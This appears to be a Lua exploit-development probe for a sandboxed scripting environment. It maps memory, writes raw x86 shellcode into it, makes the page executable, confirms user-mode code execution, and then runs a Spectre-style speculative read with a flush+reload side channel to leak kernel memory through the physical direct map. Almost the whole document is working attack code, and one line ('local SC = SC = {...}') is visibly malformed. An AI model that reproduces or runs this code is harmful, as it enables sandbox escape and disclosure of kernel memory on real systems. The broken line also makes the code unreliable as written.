-- CRASH_CLASS: MEDIUM (executes its own bytes)
-- PROBE 1246a: a speculation-based kernel read.
-- Facts this builds on:
--  * native.fcall_with_rax(fn, rax, rdi, rsi, rdx, rcx, r8, r9) is a real
--    indirect call with all six argument registers (validated by 1188a/1213b).
--  * mmap(prot=7) does NOT give an executable page: 1245a's call into it
--    faulted with RIP at the page.
--  * mmap(prot=3) + mtypeprotect(585) DOES (probe 44a ran a NOP sled that way),
--    but that probe had no return channel. This one does.
--  * The direct map base 0xffff800000000000 is known statically from the pmap
--    walker at 0x8f1480, so 0xffff800000000000 maps physical address 0 and is
--    always present regardless of KASLR.
-- The shellcode trains a bounds check to be predicted taken, then commits it with
-- an out-of-bounds index so the body executes speculatively: the load from a
-- supervisor address is squashed at retirement but has already forwarded the byte
-- into a probe array, which a flush+reload sweep then reads back.
-- Self-validating step first: the same machinery reads a USER byte whose value we
-- choose. Then the same code reads the direct map looking for the kernel ELF
-- magic at physical page 0x100000.
print("=== PROBE 1246a: speculation read ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function hilo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,N(v) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function rb(a) local ok,v=pcall(function() return N(memory.read_byte(a)) end) if ok then return v end return -1 end end
local function toaddr(v) local h,l=hilo(v) return l + h*4294967296 end

local function mmap(len, prot)
  local ok,v = pcall(function() return mk(477)(uint64(0), uint64(len), uint64(prot), uint64(0x1002), uint64(-1), uint64(0)) end)
  if not ok then return nil end
  local a = toaddr(v)
  if a <= 0 or a > 0x7FFFFFFFFFFF then return nil end
  return a
end

print(string.format("[0] pid=%d", N(mk(20)())))
local code  = mmap(0x4000, 3)
local probe = mmap(0x40000, 3)
local data  = mmap(0x4000, 3)
if not (code and probe and data) then print("[-] mmap failed "..ES()) print("=== DONE ===") return end
print(string.format("[1] code=0x%X probe=0x%X data=0x%X", code, probe, data))

-- [2] shellcode
local SC = SC = {0x48,0x89,0xFB,0x31,0xC9,0x41,0xB8,0x01,0x00,0x00,0x00,0xBD,0x30,0x00,0x00,0x00,0x44,0x39,0xC1,0x73,0x0A,0x0F,0xB6,0x03,0xC1,0xE0,0x09,0xC6,0x04,0x06,0x01,0xFF,0xCD,0x75,0xED,0x31,0xDB,0x49,0x89,0xD9,0x49,0xC1,0xE1,0x09,0x49,0x01,0xF1,0x41,0x0F,0xAE,0x39,0xFF,0xC3,0x81,0xFB,0x00,0x01,0x00,0x00,0x72,0xE8,0x0F,0xAE,0xF0,0x48,0x89,0xD3,0xB9,0x01,0x00,0x00,0x00,0x44,0x39,0xC1,0x73,0x0A,0x0F,0xB6,0x03,0xC1,0xE0,0x09,0xC6,0x04,0x06,0x01,0x31,0xDB,0x41,0xBB,0xFF,0xFF,0xFF,0x7F,0x41,0xBC,0xFF,0xFF,0xFF,0xFF,0x49,0x89,0xD9,0x49,0xC1,0xE1,0x09,0x49,0x01,0xF1,0x0F,0xAE,0xE8,0x0F,0x31,0x41,0x89,0xC2,0x0F,0xAE,0xE8,0x41,0x8A,0x01,0x0F,0xAE,0xE8,0x0F,0x31,0x44,0x29,0xD0,0x44,0x39,0xD8,0x73,0x06,0x41,0x89,0xC3,0x41,0x89,0xDC,0xFF,0xC3,0x81,0xFB,0x00,0x01,0x00,0x00,0x72,0xCB,0x44,0x89,0xD8,0xC1,0xE0,0x10,0x44,0x09,0xE0,0xC3}
for i=1,#SC do wb(code+0x100+i-1, SC[i]) end
wb(code, 0xB8) wb(code+1,0x34) wb(code+2,0x12) wb(code+3,0) wb(code+4,0) wb(code+5,0xC3)
print(string.format("[2] code bytes %02X%02X%02X%02X%02X%02X sc_len=%d",
      rb(code),rb(code+1),rb(code+2),rb(code+3),rb(code+4),rb(code+5), #SC))

-- [3] executable?
local r3 = select(2, pcall(function() return N(mk(585)(uint64(code), uint64(0x4000), uint64(7))) end))
local r4 = select(2, pcall(function() return N(mk(585)(uint64(code), uint64(0x4000), uint64(3), uint64(7))) end))
print(string.format("[3] mtypeprotect 3arg=%s 4arg=%s err=%s", tostring(r3), tostring(r4), ES()))

-- [4] execution check
local ok, v = pcall(function() return native.fcall_with_rax(code, 0,0,0,0,0,0,0) end)
if not ok then print("    EXEC-FAIL "..tostring(v)) print("=== DONE (no exec) ===") return end
print(string.format("[4] call -> 0x%X EXEC=%s", N(v), tostring(N(v)==0x1234)))
if N(v) ~= 0x1234 then print("=== DONE (no exec) ===") return end
print("*** RING-3 CODE EXECUTION CONFIRMED ***")

-- [5] user-secret validation of the speculation machinery
local train_slot = data
local secret_slot = data + 0x40
wb(train_slot, 0x00)
local SECRET = 0x37
wb(secret_slot, SECRET)
print(string.format("[5] spectre sanity: secret byte 0x%02X at 0x%X, train byte 0x00", SECRET, secret_slot))
local function leak(attack_addr, n)
  local tally, mins = {}, {}
  for i=1,n do
    local okk, rv = pcall(function() return native.fcall_with_rax(code+0x100, 0, train_slot, probe, attack_addr, 0, 0, 0) end)
    if not okk then return nil, "FAULT "..tostring(rv) end
    local x = N(rv)
    local idx = x % 65536
    local mn = math.floor(x / 65536)
    tally[idx] = (tally[idx] or 0) + 1
    mins[#mins+1] = mn
  end
  local best, bestn = -1, 0
  for k,c in pairs(tally) do if c > bestn then best, bestn = k, c end end
  table.sort(mins)
  return best, bestn, mins[1], mins[math.floor(#mins/2)]
end
local idx, cnt, mn, med = leak(secret_slot, 16)
if idx == nil then print("    "..tostring(cnt)) print("=== DONE ===") return end
print(string.format("    majority index=0x%02X (%d/16)  minDelta=%d medDelta=%d", idx, cnt, mn, med))
if idx ~= SECRET then
  print("    machinery did not reproduce the user byte; sweeping the whole probe array may still show the line")
end

-- [6] the direct map: physical 0x100000 should hold the kernel ELF header
print("[6] direct-map reads (DMAP 0xffff800000000000 + physical offset)")
local DMAP = 0xFFFF800000000000
local CHECKS = {0x0, 0x100000, 0x200000, 0x400000, 0x800000, 0x1000000, 0x2000000}
for _, phys in ipairs(CHECKS) do
  local bytes = {}
  for i=0,3 do
    local bi, bc = leak(DMAP + phys + i, 8)
    bytes[#bytes+1] = (bi and bi or -1)
  end
  print(string.format("    phys 0x%08X -> %02X %02X %02X %02X", phys, bytes[1], bytes[2], bytes[3], bytes[4]))
end
print("=== DONE ===")
